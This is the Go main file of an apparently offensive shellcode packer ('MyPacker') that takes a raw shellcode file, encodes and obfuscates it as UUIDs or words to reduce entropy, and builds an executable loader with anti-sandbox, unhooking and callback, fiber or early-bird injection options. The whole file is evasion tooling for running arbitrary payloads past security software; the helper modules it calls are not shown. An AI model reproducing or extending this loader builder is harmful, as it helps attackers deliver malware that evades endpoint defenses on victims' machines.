package main

import (
	"MyPacker/Converters"
	"MyPacker/Encrypt"
	"MyPacker/Loader"
	"MyPacker/Others"
	"flag"
	"fmt"
	"os"
)

//set CGO_ENABLED=0
//set GOOS=darwin
//set GOARCH=amd64
//-ldflags="-s -w" -o shellcode.exe

// -i calc_shellcode_64.bin
func Options() *Others.FlagOptions {
	help := flag.Bool("h", false, "Help")
	inputFile := flag.String("i", "", "Path to raw format shellcode")
	language := flag.String("lang", "c", "The language of the loader")
	outFile := flag.String("o", "Program", "output file")
	keyLength := flag.Int("k", 16, "Encrypted key length, only 16 can be selected under aes")
	obfuscation := flag.String("obf", "uuid", "Obfuscate shellcode to reduce entropy (i.e.,uuid,words)")
	framework := flag.Int("f", 64, "Choose 32-bit or 64-bit")
	sandbox := flag.Bool("sandbox", false, "Whether to enable anti-sandbox mode")
	unhook := flag.Bool("unhook", false, "Whether to use unhook mode (syscall is used by default)")
	loadingTechnique := flag.String("loading", "callback", "Please select the loading method, support callback,fiber,earlybird")
	debug := flag.Bool("debug", false, "Whether to print the shellcode intermediate encryption/obfuscation process")
	flag.Parse()

	return &Others.FlagOptions{Help: *help, OutFile: *outFile, InputFile: *inputFile, Language: *language, KeyLength: *keyLength, Obfuscation: *obfuscation, Framework: *framework, Sandbox: *sandbox, Unhook: *unhook, Loading: *loadingTechnique, Debug: *debug}
}

func main() {
	Others.PrintVersion()
	options := Options()
	if options.Help == true {
		Others.PrintUsage()
		os.Exit(0)
	}
	if options.InputFile == "" || (options.Framework != 32 && options.Framework != 64) || (options.Obfuscation != "uuid" && options.Obfuscation != "words") || (options.Loading != "fiber" && options.Loading != "callback" && options.Loading != "earlybird") {
		Others.PrintUsage()
		os.Exit(0)
	}
	fmt.Println("[+] Start packaging the exe for you\n")
	//Get the original shellcode for encryption
	shellcodeBytes := Converters.OriginalShellcode(options)
	//Get the hexadecimal shellcode
	hexShellcode := Converters.ShellcodeToHex(string(shellcodeBytes))
	//Get shellcode in template format
	formattedHexShellcode := Converters.FormattedHexShellcode(hexShellcode)
	if options.Debug == true {
		fmt.Println("[+] Shellcode after sgn encoding: " + formattedHexShellcode + "\n")
	}
	////Perform encryption operations
	//hexEncryptShellcode, Key, iv := Encrypt.Encryption(shellcodeBytes, options.Encryption, options.KeyLength)
	//if options.Debug == true {
	//	fmt.Println("[+] Encrypted shellcode: " + Converters.FormattedHexShellcode(hexEncryptShellcode) + "\n")
	//}
	//Perform obfuscation
	var (
		uuidStrings string
		words       string
		dataset     string
	)
	if options.Obfuscation != "" {
		uuidStrings, words, dataset = Encrypt.Obfuscation(options, hexShellcode)
	}
	if options.Debug == true {
		if uuidStrings != "" {
			fmt.Printf("[+] Generated UUIDs:")
			fmt.Println(uuidStrings)
		} else {
			fmt.Println("[+] Generated dataset" + string(dataset) + "\n")
			fmt.Println("[+] Generated words:" + string(words) + "\n")
		}
	}

	//Generate a template and write it to a file. Pass everything you need.
	outfile := Loader.GenerateAndWriteTemplateToFile(options, hexShellcode, uuidStrings, words, dataset)
	//compile
	Others.Build(options, outfile, options.Framework)
}
